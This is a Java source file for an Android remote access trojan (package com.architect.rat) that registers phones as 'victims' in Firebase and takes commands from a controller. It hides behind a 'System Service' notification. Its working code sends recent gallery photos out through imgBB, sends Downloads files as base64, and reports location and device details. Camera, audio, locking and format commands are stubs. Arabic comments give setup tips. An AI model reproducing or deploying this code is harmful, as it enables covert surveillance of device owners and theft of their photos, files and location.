package com.architect.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.firestore.*;

import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class AgentService extends Service {
    private static final String TAG = "ArchitectRAT";
    private static final String CHANNEL_ID = "AgentServiceChannel";
    private FirebaseFirestore db;
    private String deviceId;
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private Handler mainHandler;

    // مفتاح imgBB – يجب استبداله بقيمتك
    private final String IMGBB_API_KEY = "YOUR_IMGBB_API_KEY";

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        startForegroundService();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        db = FirebaseFirestore.getInstance();

        Map<String, Object> victim = new HashMap<>();
        victim.put("name", Build.MODEL);
        victim.put("os", "Android " + Build.VERSION.RELEASE);
        victim.put("lastSeen", FieldValue.serverTimestamp());
        db.collection("victims").document(deviceId).set(victim);

        db.collection("victims").document(deviceId).collection("commands")
                .whereEqualTo("status", "pending")
                .addSnapshotListener((snapshots, e) -> {
                    if (e != null || snapshots == null) return;
                    for (DocumentSnapshot doc : snapshots.getDocuments()) {
                        String command = doc.getString("command");
                        String code = doc.getString("code");
                        executeCommand(command, code);
                        doc.getReference().update("status", "done");
                    }
                });
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1337, notification);
    }

    private void executeCommand(String cmd, String extra) {
        executor.execute(() -> {
            try {
                switch (cmd) {
                    case "gallery": uploadPhotos(); break;
                    case "files": uploadFiles(); break;
                    case "vibrate": vibrate(); break;
                    case "toast": showToast("Message from controller"); break;
                    case "location": sendLocation(); break;
                    case "device_info": sendDeviceInfo(); break;
                    case "camera_front": capturePhoto(true); break;
                    case "camera_back": capturePhoto(false); break;
                    case "record_audio": recordAudio(); break;
                    case "record_video": recordVideo(); break;
                    case "lock_code": lockDevice(extra); break;
                    case "format": formatDevice(); break;
                }
            } catch (Exception e) {
                Log.e(TAG, "Command failed: " + cmd, e);
            }
        });
    }

    private void vibrate() {
        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) v.vibrate(500);
    }

    private void showToast(String message) {
        mainHandler.post(() -> Toast.makeText(getApplicationContext(), message, Toast.LENGTH_LONG).show());
    }

    private void sendDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("Model: ").append(Build.MODEL).append("\n");
        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        info.append("OS: Android ").append(Build.VERSION.RELEASE).append("\n");
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        info.append("Battery: ").append(level).append("%\n");

        Map<String, Object> result = new HashMap<>();
        result.put("type", "device_info");
        result.put("info", info.toString());
        result.put("timestamp", FieldValue.serverTimestamp());
        db.collection("victims").document(deviceId).collection("results").add(result);
    }

    private void sendLocation() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        Location loc = null;
        if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }
        if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }
        if (loc == null) {
            lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendLocationData(location.getLatitude(), location.getLongitude());
                }
            }, getMainLooper());
        } else {
            sendLocationData(loc.getLatitude(), loc.getLongitude());
        }
    }

    private void sendLocationData(double lat, double lng) {
        Map<String, Object> result = new HashMap<>();
        result.put("type", "location");
        result.put("lat", lat);
        result.put("lng", lng);
        result.put("timestamp", FieldValue.serverTimestamp());
        db.collection("victims").document(deviceId).collection("results").add(result);
    }

    private void uploadPhotos() {
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5"
        );
        if (cursor == null) return;
        while (cursor.moveToNext()) {
            String path = cursor.getString(0);
            File imgFile = new File(path);
            if (imgFile.exists()) {
                try {
                    Bitmap bitmap = BitmapFactory.decodeFile(path);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                    byte[] imageData = baos.toByteArray();
                    String imageUrl = uploadToImgBB(imageData);
                    if (imageUrl != null) {
                        Map<String, Object> result = new HashMap<>();
                        result.put("type", "photo");
                        result.put("url", imageUrl);
                        result.put("timestamp", FieldValue.serverTimestamp());
                        db.collection("victims").document(deviceId).collection("results").add(result);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Upload photo error", e);
                }
            }
        }
        cursor.close();
    }

    private String uploadToImgBB(byte[] imageData) {
        try {
            URL url = new URL("https://api.imgbb.com/1/upload?key=" + IMGBB_API_KEY);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String base64Image = Base64.encodeToString(imageData, Base64.NO_WRAP);
            String postData = "image=" + URLEncoder.encode(base64Image, "UTF-8");

            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes());
            os.flush();
            os.close();

            if (conn.getResponseCode() == 200) {
                InputStream is = conn.getInputStream();
                String response = readStream(is);
                is.close();
                JSONObject json = new JSONObject(response);
                return json.getJSONObject("data").getString("url");
            }
        } catch (Exception e) {
            Log.e(TAG, "imgBB upload error", e);
        }
        return null;
    }

    private void uploadFiles() {
        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File[] files = downloadsDir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isFile() && file.length() < 10 * 1024 * 1024) {
                try {
                    FileInputStream fis = new FileInputStream(file);
                    byte[] data = new byte[(int) file.length()];
                    fis.read(data);
                    fis.close();
                    String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                    // هنا يمكنك استخدام خدمة رفع ملفات مثل file.io
                    // للإصدار الأول نكتفي بتخزينها كـ base64 (قد تكون كبيرة)
                    Map<String, Object> result = new HashMap<>();
                    result.put("type", "file");
                    result.put("filename", file.getName());
                    result.put("base64", base64);
                    result.put("timestamp", FieldValue.serverTimestamp());
                    db.collection("victims").document(deviceId).collection("results").add(result);
                } catch (Exception e) {
                    Log.e(TAG, "Upload file error", e);
                }
            }
        }
    }

    private void capturePhoto(boolean front) {
        // تحتاج CameraX API – للإصدار الأول يمكن تجاهلها أو استخدام Intent
        showToast("Camera feature not implemented in this version.");
    }

    private void recordAudio() {
        showToast("Audio recording not implemented in this version.");
    }

    private void recordVideo() {
        showToast("Video recording not implemented in this version.");
    }

    private void lockDevice(String code) {
        // يحتاج Device Admin – غالبًا لا يعمل بدون صلاحيات خاصة
        showToast("Lock device not implemented.");
    }

    private void formatDevice() {
        // خطير ويحتاج روت
        showToast("Format not implemented.");
    }

    private String readStream(InputStream is) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int len;
        while ((len = is.read(buffer)) != -1) baos.write(buffer, 0, len);
        return baos.toString("UTF-8");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
